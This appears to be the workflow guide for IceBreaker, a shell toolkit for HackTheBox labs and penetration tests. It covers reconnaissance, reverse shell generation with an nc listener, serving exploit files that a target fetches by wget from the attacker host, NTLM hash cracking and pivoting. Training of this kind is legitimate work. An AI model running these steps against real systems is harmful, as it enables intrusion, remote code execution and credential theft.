```
 ┌─────────────────────────────────────────────────────────┐
 │  ICEBREAKER // RUN PROTOCOL                             │
 │  "He'd come in steep, fueled by a triple dose of        │
 │   Brazilian dex."  — Neuromancer                        │
 └─────────────────────────────────────────────────────────┘
```

# Engagement Workflow

A step-by-step guide to using IceBreaker for a HackTheBox box or penetration test engagement.

## Quick Reference

```bash
htb                                # Connect VPN
newbox forest 10.10.10.161        # Create target scaffold + set vars
htb-tmux                           # Launch tmux layout
nmap-init                          # Initial scan
nmap-allports                      # Full port scan
# ... hack ...
flag abc123 "user.txt"             # Log flags
cred admin P@ss ssh                # Log creds
```

## Full Walkthrough

### 1. Connect to VPN

```bash
htb                    # HackTheBox
# or
thm                    # TryHackMe
```

Verify connection:
```bash
vpnip                  # Should show your tun0 IP
vpnstat                # Show tunnel interface
```

### 2. Set Up the Target

```bash
newbox forest 10.10.10.161
```

This:
- Creates `~/targets/forest/` with nmap/, loot/, exploits/, www/
- Creates flags.txt, creds.txt, notes.md
- Symlinks `~/targets/current` → `~/targets/forest/`
- Sets `$TARGET=10.10.10.161`, auto-detects `$LHOST`, `$LPORT=4444`
- Changes into the directory

### 3. Launch Tmux Layout

```bash
htb-tmux
```

You now have:
- **Top pane:** Main terminal for commands
- **Bottom-left:** notes.md open in nvim
- **Bottom-right:** Listener info, ready for `rlisten`

### 4. Reconnaissance

```bash
# Initial scan (uses $TARGET automatically)
nmap-init

# Full port scan
nmap-allports

# Targeted scan on discovered ports
nmap-targeted $TARGET 88,135,389,445,636

# Check nmap output
cat nmap/initial.nmap
```

Other recon:
```bash
# Web enumeration
ffuf -w $WORDLISTS/Discovery/Web-Content/common.txt -u http://$TARGET/FUZZ
gobuster dir -w $WORDLISTS/Discovery/Web-Content/big.txt -u http://$TARGET

# DNS
dig axfr @$TARGET domain.htb

# SMB
smbmap -H $TARGET
enum4linux-ng $TARGET
```

### 5. Take Notes

Switch to the notes pane (bottom-left) and document findings:

```markdown
## Recon
- Port 88: Kerberos → Domain Controller
- Port 445: SMB, domain: HTB.LOCAL
- Port 5985: WinRM open

## Users found
- Administrator
- svc-alfresco
```

### 6. Exploitation

```bash
# Generate a reverse shell payload
revshell bash
revshell powershell

# Start a listener (in the bottom-right pane)
rlisten                 # nc -lvnp 4444

# Or use metasploit
msfconsole
```

For web exploits:
```bash
# Serve exploit files
cd www/
cp /path/to/exploit.php .
serve                   # python3 -m http.server 8080

# On target: wget http://$LHOST:8080/exploit.php
```

### 7. Log Credentials and Flags

As you find them:
```bash
cred svc-alfresco s3rvice ldap
cred administrator aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb... ntlm

flag 1a2b3c4d5e6f7890 "user.txt"
flag 9f8e7d6c5b4a3210 "root.txt"
```

### 8. Privilege Escalation

```bash
# Check hashcat mode for found hashes
hcmode ntlm
# 1000    NTLM

# Crack hashes
hashcat -m 1000 hashes.txt $ROCKYOU

# If pivoting is needed
setproxy 1080
proxychains nmap -sT -Pn 172.16.0.0/24
```

### 9. Clean Up

After the engagement:
```bash
# Review your notes
cat ~/targets/forest/flags.txt
cat ~/targets/forest/creds.txt

# Kill VPN
vpnstop

# Your work is saved in ~/targets/forest/
```

## Directory Structure After an Engagement

```
~/targets/forest/
├── nmap/
│   ├── initial.nmap
│   ├── initial.gnmap
│   ├── initial.xml
│   ├── allports.nmap
│   ├── allports.gnmap
│   ├── allports.xml
│   ├── targeted.nmap
│   ├── targeted.gnmap
│   └── targeted.xml
├── loot/
│   ├── hashes.txt
│   └── sam_dump.txt
├── exploits/
│   └── privesc.py
├── www/
│   └── shell.php
├── flags.txt
├── creds.txt
└── notes.md
```

## Multiple Targets

For engagements with multiple hosts:

```bash
newbox dc01 10.10.10.161
# ... work on DC01 ...

newbox web01 10.10.10.162
# ~/targets/current now points to web01

# Switch back to DC01
cd ~/targets/dc01
settarget 10.10.10.161
```

## CTF Competitions

For CTFs with many quick challenges:

```bash
mkdir -p ~/ctf/event-name
cd ~/ctf/event-name

# For each challenge
newbox challenge-name
# ... solve ...
flag{the_answer}
```
